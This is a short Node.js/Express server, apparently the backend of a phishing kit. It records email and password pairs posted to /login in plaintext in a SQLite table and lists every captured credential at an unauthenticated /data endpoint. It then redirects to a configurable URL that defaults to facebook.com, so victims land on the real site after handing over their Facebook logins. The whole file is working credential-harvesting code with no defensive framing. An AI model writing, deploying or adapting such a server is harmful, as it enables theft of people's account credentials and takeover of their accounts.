const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const cors = require("cors");
const path = require("path");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// Base de Datos con soporte para contador
const db = new sqlite3.Database("database.db");

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        password TEXT,
        date DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY,
        redirect_url TEXT,
        counter_id TEXT
    )`, () => {
        db.run("INSERT OR IGNORE INTO config (id, redirect_url, counter_id) VALUES (1, 'https://www.facebook.com', '')");
    });
});

// Rutas de Configuración
app.get("/config", (req, res) => {
    db.get("SELECT * FROM config WHERE id = 1", (err, row) => {
        res.json(row || { redirect_url: "https://www.facebook.com", counter_id: "" });
    });
});

app.post("/config", (req, res) => {
    const { url, counter_id } = req.body;
    db.run("UPDATE config SET redirect_url = ?, counter_id = ? WHERE id = 1", [url, counter_id], () => {
        res.json({ success: true });
    });
});

// Rutas de Datos
app.post("/login", (req, res) => {
    const { email, password } = req.body;
    db.run("INSERT INTO logins (email, password) VALUES (?, ?)", [email, password], () => {
        res.json({ saved: true });
    });
});

app.get("/data", (req, res) => {
    db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => {
        res.json(rows);
    });
});

app.delete("/delete/:id", (req, res) => {
    db.run("DELETE FROM logins WHERE id = ?", [req.params.id], () => {
        res.json({ deleted: true });
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
